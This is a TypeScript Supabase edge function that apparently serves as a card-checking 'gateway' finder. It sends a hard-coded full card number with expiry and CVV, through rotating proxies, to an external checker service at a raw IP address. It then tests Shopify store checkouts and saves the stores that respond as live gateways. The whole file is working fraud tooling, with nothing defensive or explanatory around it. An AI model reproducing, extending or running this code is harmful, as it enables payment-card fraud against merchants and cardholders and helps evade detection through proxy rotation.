import { createClient } from "npm:@supabase/supabase-js@2";

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const TEST_CC = "4266841674104656|03|27|908";

const extractPrice = (response: string): { price: number; priceStr: string } => {
  const pricePatterns = [
    /\$[\d,]+\.?\d*/g,
    /USD\s*[\d,]+\.?\d*/gi,
    /"price":\s*"?[\d.]+/gi,
    /"amount":\s*"?[\d.]+/gi,
    /"total":\s*"?[\d.]+/gi,
  ];

  let lowestPrice = Infinity;
  let priceStr = "$0.00";

  for (const pattern of pricePatterns) {
    const matches = response.match(pattern);
    if (matches) {
      for (const match of matches) {
        const numericMatch = match.replace(/[^0-9.]/g, "");
        const value = parseFloat(numericMatch);
        if (!isNaN(value) && value >= 0 && value < lowestPrice) {
          lowestPrice = value;
          priceStr = `$${value.toFixed(2)}`;
        }
      }
    }
  }

  return {
    price: lowestPrice === Infinity ? 0 : lowestPrice,
    priceStr: lowestPrice === Infinity ? "$0.00" : priceStr,
  };
};

const badResponses = [
  "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
  "Site not supported",
  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
  "Payment method not available",
  "ARTIFACT_DISSATISFACTION",
  "VALIDATION_CUSTOM",
];

const checkSingleSite = async (
  siteUrl: string,
  proxyStr: string,
  supabase: ReturnType<typeof createClient>,
): Promise<{ url: string; status: string; price: number; priceStr: string; apiResponse?: string; error?: string }> => {
  const maxAttempts = 2;
  const timeoutMs = 55000; // 55s per attempt — generous for slow sites

  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

      const apiUrl = `http://188.137.230.163:5000/shopify?site=${encodeURIComponent(siteUrl)}&cc=${encodeURIComponent(TEST_CC)}&proxy=${encodeURIComponent(proxyStr)}`;

      console.log(`[Attempt ${attempt + 1}] Checking: ${siteUrl}`);

      const response = await fetch(apiUrl, {
        method: "GET",
        signal: controller.signal,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          "Accept": "application/json, text/plain, */*",
          "Accept-Language": "en-US,en;q=0.9",
          "Connection": "keep-alive",
          "Cache-Control": "no-cache",
        },
      });

      clearTimeout(timeoutId);

      const responseText = await response.text();

      if (!response.ok || !responseText || responseText.length < 3) {
        console.log(`[Attempt ${attempt + 1}] Bad HTTP response for ${siteUrl}: status=${response.status}, bodyLen=${responseText?.length ?? 0}`);
        if (attempt < maxAttempts - 1) {
          await new Promise(r => setTimeout(r, 2000));
          continue;
        }
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: responseText || `HTTP ${response.status}`, error: "No valid response" };
      }

      const { price, priceStr } = extractPrice(responseText);
      const truncated = responseText.length > 500 ? responseText.substring(0, 500) + "..." : responseText;

      const isBad = badResponses.some(bad => responseText.toLowerCase().includes(bad.toLowerCase()));
      if (isBad) {
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        console.log(`[Result] ${siteUrl} → DEAD (bad response)`);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: truncated, error: "Bad response detected" };
      }

      if (price > 0) {
        await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
        console.log(`[Result] ${siteUrl} → LIVE (${priceStr})`);
        return { url: siteUrl, status: "live", price, priceStr, apiResponse: truncated };
      }

      console.log(`[Result] ${siteUrl} → DEAD (price=0)`);
      return { url: siteUrl, status: "dead", price, priceStr, apiResponse: truncated };

    } catch (err) {
      const msg = err instanceof Error ? err.message : "Unknown error";
      console.log(`[Attempt ${attempt + 1}] Error for ${siteUrl}: ${msg}`);
      if (attempt < maxAttempts - 1) {
        await new Promise(r => setTimeout(r, 2000));
        continue;
      }
      return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse: "", error: msg };
    }
  }

  return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse: "", error: "All attempts failed" };
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    const token = authHeader.replace("Bearer ", "");
    const { data: { user }, error: authError } = await createClient(SUPABASE_URL, Deno.env.get("SUPABASE_ANON_KEY") || "").auth.getUser(token);

    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { data: roleData } = await supabase
      .from("user_roles")
      .select("role")
      .eq("user_id", user.id)
      .eq("role", "admin")
      .maybeSingle();

    if (!roleData) {
      return new Response(JSON.stringify({ error: "Admin access required" }), { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { urls, threads = 1 } = await req.json();

    if (!urls || !Array.isArray(urls) || urls.length === 0) {
      return new Response(JSON.stringify({ error: "No URLs provided" }), { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Fetch live proxies
    const { data: liveProxies } = await supabase
      .from("proxies")
      .select("*")
      .eq("status", "live");

    const getProxyStr = (): string => {
      if (!liveProxies || liveProxies.length === 0) return "";
      const randomProxy = liveProxies[Math.floor(Math.random() * liveProxies.length)];
      if (randomProxy.username && randomProxy.password) {
        return `${randomProxy.ip}:${randomProxy.port}:${randomProxy.username}:${randomProxy.password}`;
      }
      return `${randomProxy.ip}:${randomProxy.port}`;
    };

    // Process sites sequentially — each site gets a full dedicated request
    const results: Array<{ url: string; status: string; price: number; priceStr: string; apiResponse?: string; error?: string }> = [];
    let savedCount = 0;

    for (const siteUrl of urls) {
      const proxyStr = getProxyStr();
      const result = await checkSingleSite(siteUrl, proxyStr, supabase);
      results.push(result);
      if (result.status === "live") savedCount++;
    }

    return new Response(
      JSON.stringify({
        success: true,
        total: urls.length,
        live: savedCount,
        dead: results.filter(r => r.status === "dead").length,
        errors: results.filter(r => r.status === "error").length,
        results,
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (error) {
    console.error("Health check error:", error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : "Internal error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
